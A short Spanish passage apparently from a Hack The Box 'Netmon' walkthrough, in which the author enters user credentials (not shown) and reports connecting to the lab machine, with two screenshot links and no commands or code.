Ahora, pongamos los datos del usuario, esta vez usare mi usuario, prueba con los demás usuarios que ya obtuvimos antes:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura11.png">
</p>

Y listo, nos hemos conectado a la máquina:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura12.png">
</p>
